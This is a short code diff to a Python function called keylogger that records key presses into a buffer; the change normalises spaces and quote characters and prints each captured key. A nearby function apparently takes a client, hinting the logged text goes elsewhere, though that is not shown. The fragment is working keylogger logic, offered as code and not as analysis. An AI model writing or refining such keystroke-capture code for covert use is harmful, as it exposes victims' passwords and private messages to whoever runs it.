@@ -8,7 +8,15 @@ def keylogger(key):
     if flag == 4:
         return False
     if flag == 1:
-        cont += str(key)
+        tmp = str(key)
+        if tmp == 'Key.space':
+            tmp = ' '
+        elif tmp == '"\'"':
+            tmp = "'"
+        else:
+            tmp = tmp.replace("'", "")
+        print(tmp)
+        cont += str(tmp)
     return
         
 def _print(client):
